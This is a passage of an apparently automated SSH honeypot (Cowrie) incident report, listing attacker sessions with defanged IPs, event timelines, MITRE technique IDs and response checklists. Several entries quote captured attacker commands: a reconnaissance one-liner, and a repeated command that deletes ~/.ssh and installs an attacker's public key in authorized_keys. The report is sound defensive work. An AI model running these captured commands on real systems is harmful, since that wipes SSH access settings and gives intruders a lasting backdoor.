- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b31ebf5da43

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 20:07 |
| **Last Seen** | 2026-09-25 20:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:07:27` | `cowrie.session.connect` |
| `2026-09-25 20:07:28` | `cowrie.client.version` |
| `2026-09-25 20:07:28` | `cowrie.client.kex` |
| `2026-09-25 20:07:30` | `cowrie.login.success` |
| `2026-09-25 20:07:31` | `cowrie.session.params` |
| `2026-09-25 20:07:31` | `cowrie.command.input` |
| `2026-09-25 20:07:31` | `cowrie.command.input` |
| `2026-09-25 20:07:31` | `cowrie.command.input` |
| `2026-09-25 20:07:31` | `cowrie.command.input` |
| `2026-09-25 20:07:31` | `cowrie.command.input` |
| `2026-09-25 20:07:31` | `cowrie.command.success` |
| `2026-09-25 20:07:31` | `cowrie.command.input` |
| `2026-09-25 20:07:31` | `cowrie.command.input` |
| `2026-09-25 20:07:31` | `cowrie.command.input` |
| `2026-09-25 20:07:31` | `cowrie.command.input` |
| `2026-09-25 20:07:32` | `cowrie.log.closed` |
| `2026-09-25 20:07:33` | `cowrie.session.params` |
| `2026-09-25 20:07:33` | `cowrie.command.input` |
| `2026-09-25 20:07:34` | `cowrie.log.closed` |
| `2026-09-25 20:07:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e187eada9dd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 20:09 |
| **Last Seen** | 2026-09-25 20:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:09:14` | `cowrie.session.connect` |
| `2026-09-25 20:09:15` | `cowrie.client.version` |
| `2026-09-25 20:09:15` | `cowrie.client.kex` |
| `2026-09-25 20:09:16` | `cowrie.login.success` |
| `2026-09-25 20:09:17` | `cowrie.session.params` |
| `2026-09-25 20:09:17` | `cowrie.command.input` |
| `2026-09-25 20:09:17` | `cowrie.command.input` |
| `2026-09-25 20:09:17` | `cowrie.command.input` |
| `2026-09-25 20:09:17` | `cowrie.command.input` |
| `2026-09-25 20:09:17` | `cowrie.command.input` |
| `2026-09-25 20:09:17` | `cowrie.command.success` |
| `2026-09-25 20:09:17` | `cowrie.command.input` |
| `2026-09-25 20:09:17` | `cowrie.command.input` |
| `2026-09-25 20:09:17` | `cowrie.command.input` |
| `2026-09-25 20:09:17` | `cowrie.command.input` |
| `2026-09-25 20:09:18` | `cowrie.log.closed` |
| `2026-09-25 20:09:19` | `cowrie.session.params` |
| `2026-09-25 20:09:19` | `cowrie.command.input` |
| `2026-09-25 20:09:20` | `cowrie.log.closed` |
| `2026-09-25 20:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31bb44764bf3

| Field | Detail |
|---|---|
| **Source IP** | `41.173.43[.]34` |
| **First Seen** | 2026-09-25 20:29 |
| **Last Seen** | 2026-09-25 20:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:29:37` | `cowrie.session.connect` |
| `2026-09-25 20:29:37` | `cowrie.client.version` |
| `2026-09-25 20:29:38` | `cowrie.client.kex` |
| `2026-09-25 20:29:39` | `cowrie.login.success` |
| `2026-09-25 20:29:40` | `cowrie.session.params` |
| `2026-09-25 20:29:40` | `cowrie.command.input` |
| `2026-09-25 20:29:40` | `cowrie.command.failed` |
| `2026-09-25 20:29:40` | `cowrie.log.closed` |
| `2026-09-25 20:29:41` | `cowrie.session.params` |
| `2026-09-25 20:29:41` | `cowrie.command.input` |
| `2026-09-25 20:29:42` | `cowrie.session.file_download` |
| `2026-09-25 20:29:42` | `cowrie.log.closed` |
| `2026-09-25 20:29:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.173.43[.]34` to AbuseIPDB if not already reported
- [ ] Block `41.173.43[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfae0f9380d1

| Field | Detail |
|---|---|
| **Source IP** | `41.173.43[.]34` |
| **First Seen** | 2026-09-25 20:29 |
| **Last Seen** | 2026-09-25 20:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:29:42` | `cowrie.session.connect` |
| `2026-09-25 20:29:42` | `cowrie.client.version` |
| `2026-09-25 20:29:42` | `cowrie.client.kex` |
| `2026-09-25 20:29:43` | `cowrie.login.success` |
| `2026-09-25 20:29:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.173.43[.]34` to AbuseIPDB if not already reported
- [ ] Block `41.173.43[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d311391819e4

| Field | Detail |
|---|---|
| **Source IP** | `41.173.43[.]34` |
| **First Seen** | 2026-09-25 20:29 |
| **Last Seen** | 2026-09-25 20:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:29:44` | `cowrie.session.connect` |
| `2026-09-25 20:29:44` | `cowrie.client.version` |
| `2026-09-25 20:29:44` | `cowrie.client.kex` |
| `2026-09-25 20:29:45` | `cowrie.login.success` |
| `2026-09-25 20:29:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.173.43[.]34` to AbuseIPDB if not already reported
- [ ] Block `41.173.43[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1e75a94ceef

| Field | Detail |
|---|---|
| **Source IP** | `189.149.254[.]122` |
| **First Seen** | 2026-09-25 20:30 |
| **Last Seen** | 2026-09-25 20:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:30:44` | `cowrie.session.connect` |
| `2026-09-25 20:30:44` | `cowrie.client.version` |
| `2026-09-25 20:30:44` | `cowrie.client.kex` |
| `2026-09-25 20:30:45` | `cowrie.login.success` |
| `2026-09-25 20:30:45` | `cowrie.session.params` |
| `2026-09-25 20:30:45` | `cowrie.command.input` |
| `2026-09-25 20:30:45` | `cowrie.command.failed` |
| `2026-09-25 20:30:46` | `cowrie.log.closed` |
| `2026-09-25 20:30:46` | `cowrie.session.params` |
| `2026-09-25 20:30:46` | `cowrie.command.input` |
| `2026-09-25 20:30:47` | `cowrie.session.file_download` |
| `2026-09-25 20:30:47` | `cowrie.log.closed` |
| `2026-09-25 20:30:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.149.254[.]122` to AbuseIPDB if not already reported
- [ ] Block `189.149.254[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59bb5c5e9063

| Field | Detail |
|---|---|
| **Source IP** | `189.149.254[.]122` |
| **First Seen** | 2026-09-25 20:30 |
| **Last Seen** | 2026-09-25 20:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:30:47` | `cowrie.session.connect` |
| `2026-09-25 20:30:47` | `cowrie.client.version` |
| `2026-09-25 20:30:47` | `cowrie.client.kex` |
| `2026-09-25 20:30:47` | `cowrie.login.success` |
| `2026-09-25 20:30:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.149.254[.]122` to AbuseIPDB if not already reported
- [ ] Block `189.149.254[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82a777f56e4d

| Field | Detail |
|---|---|
| **Source IP** | `189.149.254[.]122` |
| **First Seen** | 2026-09-25 20:30 |
| **Last Seen** | 2026-09-25 20:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:30:47` | `cowrie.session.connect` |
| `2026-09-25 20:30:47` | `cowrie.client.version` |
| `2026-09-25 20:30:47` | `cowrie.client.kex` |
| `2026-09-25 20:30:48` | `cowrie.login.success` |
| `2026-09-25 20:30:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.149.254[.]122` to AbuseIPDB if not already reported
- [ ] Block `189.149.254[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd25c444666d

| Field | Detail |
|---|---|
| **Source IP** | `217.154.35[.]203` |
| **First Seen** | 2026-09-25 20:30 |
| **Last Seen** | 2026-09-25 20:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:30:58` | `cowrie.session.connect` |
| `2026-09-25 20:30:58` | `cowrie.client.version` |
| `2026-09-25 20:30:58` | `cowrie.client.kex` |
| `2026-09-25 20:30:58` | `cowrie.login.success` |
| `2026-09-25 20:30:59` | `cowrie.session.params` |
| `2026-09-25 20:30:59` | `cowrie.command.input` |
| `2026-09-25 20:30:59` | `cowrie.command.failed` |
| `2026-09-25 20:30:59` | `cowrie.log.closed` |
| `2026-09-25 20:31:00` | `cowrie.session.params` |
| `2026-09-25 20:31:00` | `cowrie.command.input` |
| `2026-09-25 20:31:00` | `cowrie.session.file_download` |
| `2026-09-25 20:31:00` | `cowrie.log.closed` |
| `2026-09-25 20:31:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.35[.]203` to AbuseIPDB if not already reported
- [ ] Block `217.154.35[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8417cb55801d

| Field | Detail |
|---|---|
| **Source IP** | `217.154.35[.]203` |
| **First Seen** | 2026-09-25 20:31 |
| **Last Seen** | 2026-09-25 20:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:31:00` | `cowrie.session.connect` |
| `2026-09-25 20:31:00` | `cowrie.client.version` |
| `2026-09-25 20:31:00` | `cowrie.client.kex` |
| `2026-09-25 20:31:00` | `cowrie.login.success` |
| `2026-09-25 20:31:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.35[.]203` to AbuseIPDB if not already reported
- [ ] Block `217.154.35[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62f93bf78577

| Field | Detail |
|---|---|
| **Source IP** | `217.154.35[.]203` |
| **First Seen** | 2026-09-25 20:31 |
| **Last Seen** | 2026-09-25 20:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:31:00` | `cowrie.session.connect` |
| `2026-09-25 20:31:00` | `cowrie.client.version` |
| `2026-09-25 20:31:00` | `cowrie.client.kex` |
| `2026-09-25 20:31:01` | `cowrie.login.success` |
| `2026-09-25 20:31:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.35[.]203` to AbuseIPDB if not already reported
- [ ] Block `217.154.35[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-807f7380e6c1

| Field | Detail |
|---|---|
| **Source IP** | `203.55.81[.]1` |
| **First Seen** | 2026-09-25 20:41 |
| **Last Seen** | 2026-09-25 20:41 |
| **Session Duration** | 24s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:41:06` | `cowrie.session.connect` |
| `2026-09-25 20:41:06` | `cowrie.client.version` |
| `2026-09-25 20:41:06` | `cowrie.client.kex` |
| `2026-09-25 20:41:07` | `cowrie.client.fingerprint` |
| `2026-09-25 20:41:07` | `cowrie.login.failed` |
| `2026-09-25 20:41:08` | `cowrie.login.success` |
| `2026-09-25 20:41:29` | `cowrie.direct-tcpip.request` |
| `2026-09-25 20:41:29` | `cowrie.direct-tcpip.ja4` |
| `2026-09-25 20:41:29` | `cowrie.direct-tcpip.data` |
| `2026-09-25 20:41:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.55.81[.]1` to AbuseIPDB if not already reported
- [ ] Block `203.55.81[.]1` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-934d46043785

| Field | Detail |
|---|---|
| **Source IP** | `222.107.156[.]227` |
| **First Seen** | 2026-09-25 20:44 |
| **Last Seen** | 2026-09-25 20:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:44:27` | `cowrie.session.connect` |
| `2026-09-25 20:44:27` | `cowrie.client.version` |
| `2026-09-25 20:44:27` | `cowrie.client.kex` |
| `2026-09-25 20:44:28` | `cowrie.login.success` |
| `2026-09-25 20:44:29` | `cowrie.session.params` |
| `2026-09-25 20:44:29` | `cowrie.command.input` |
| `2026-09-25 20:44:29` | `cowrie.command.failed` |
| `2026-09-25 20:44:30` | `cowrie.log.closed` |
| `2026-09-25 20:44:30` | `cowrie.session.params` |
| `2026-09-25 20:44:30` | `cowrie.command.input` |
| `2026-09-25 20:44:31` | `cowrie.session.file_download` |
| `2026-09-25 20:44:31` | `cowrie.log.closed` |
| `2026-09-25 20:44:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.107.156[.]227` to AbuseIPDB if not already reported
- [ ] Block `222.107.156[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c11c1cb56f4

| Field | Detail |
|---|---|
| **Source IP** | `222.107.156[.]227` |
| **First Seen** | 2026-09-25 20:44 |
| **Last Seen** | 2026-09-25 20:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:44:31` | `cowrie.session.connect` |
| `2026-09-25 20:44:31` | `cowrie.client.version` |
| `2026-09-25 20:44:31` | `cowrie.client.kex` |
| `2026-09-25 20:44:32` | `cowrie.login.success` |
| `2026-09-25 20:44:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.107.156[.]227` to AbuseIPDB if not already reported
- [ ] Block `222.107.156[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af9f66120da1

| Field | Detail |
|---|---|
| **Source IP** | `222.107.156[.]227` |
| **First Seen** | 2026-09-25 20:44 |
| **Last Seen** | 2026-09-25 20:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:44:32` | `cowrie.session.connect` |
| `2026-09-25 20:44:32` | `cowrie.client.version` |
| `2026-09-25 20:44:32` | `cowrie.client.kex` |
| `2026-09-25 20:44:33` | `cowrie.login.success` |
| `2026-09-25 20:44:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.107.156[.]227` to AbuseIPDB if not already reported
- [ ] Block `222.107.156[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-861236de2fc3

| Field | Detail |
|---|---|
| **Source IP** | `201.16.238[.]49` |
| **First Seen** | 2026-09-25 20:48 |
| **Last Seen** | 2026-09-25 20:48 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:48:31` | `cowrie.session.connect` |
| `2026-09-25 20:48:31` | `cowrie.client.version` |
| `2026-09-25 20:48:31` | `cowrie.client.kex` |
| `2026-09-25 20:48:32` | `cowrie.login.success` |
| `2026-09-25 20:48:35` | `cowrie.session.params` |
| `2026-09-25 20:48:35` | `cowrie.command.input` |
| `2026-09-25 20:48:35` | `cowrie.command.failed` |
| `2026-09-25 20:48:39` | `cowrie.log.closed` |
| `2026-09-25 20:48:39` | `cowrie.session.params` |
| `2026-09-25 20:48:39` | `cowrie.command.input` |
| `2026-09-25 20:48:40` | `cowrie.session.file_download` |
| `2026-09-25 20:48:40` | `cowrie.log.closed` |
| `2026-09-25 20:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.16.238[.]49` to AbuseIPDB if not already reported
- [ ] Block `201.16.238[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1629f9dadb5

| Field | Detail |
|---|---|
| **Source IP** | `201.16.238[.]49` |
| **First Seen** | 2026-09-25 20:48 |
| **Last Seen** | 2026-09-25 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:48:40` | `cowrie.session.connect` |
| `2026-09-25 20:48:40` | `cowrie.client.version` |
| `2026-09-25 20:48:41` | `cowrie.client.kex` |
| `2026-09-25 20:48:41` | `cowrie.login.success` |
| `2026-09-25 20:48:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.16.238[.]49` to AbuseIPDB if not already reported
- [ ] Block `201.16.238[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09f1c5fa643c

| Field | Detail |
|---|---|
| **Source IP** | `201.16.238[.]49` |
| **First Seen** | 2026-09-25 20:48 |
| **Last Seen** | 2026-09-25 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 20:48:42` | `cowrie.session.connect` |
| `2026-09-25 20:48:42` | `cowrie.client.version` |
| `2026-09-25 20:48:42` | `cowrie.client.kex` |
| `2026-09-25 20:48:43` | `cowrie.login.success` |
| `2026-09-25 20:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.16.238[.]49` to AbuseIPDB if not already reported
- [ ] Block `201.16.238[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e1920317005

| Field | Detail |
|---|---|
| **Source IP** | `217.154.234[.]6` |
| **First Seen** | 2026-09-25 20:51 |
| **Last Seen** | 2026-09-25 20:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
